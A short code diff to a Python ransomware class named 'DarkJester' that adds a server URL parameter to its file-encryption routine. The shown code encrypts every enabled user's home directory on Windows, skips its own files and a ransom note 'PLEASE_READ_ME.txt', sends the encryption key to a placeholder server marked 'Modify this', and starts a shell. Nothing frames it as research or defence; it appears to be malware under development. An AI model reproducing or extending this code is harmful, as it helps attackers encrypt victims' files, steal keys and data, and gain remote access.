@@ -71,7 +71,7 @@ class DarkJester:
         except Exception as e:
             print(f"[-] Error exfiltrating {filepath}: {e}")
 
-    def encrypt_file(self, filepath):
+    def encrypt_file(self, filepath, server_url):
         try:
             if os.path.basename(filepath) in ["darkjester_encryptor_mass.py", "darkjester_encryptor_mass.exe", "PLEASE_READ_ME.txt", "darkjester_decryptor_mass.py", "darkjester_decryptor_mass.exe"]:
                 return
@@ -186,7 +186,7 @@ if __name__ == "__main__":
     for user in enabled_users:
         user_directory = f"C:\\Users\\{user}"
         if os.path.exists(user_directory):
-            jester.encrypt_directory(user_directory, max_threads=30)
+            jester.encrypt_directory(user_directory, server_url, max_threads=30)
     jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
     shell.start()
 
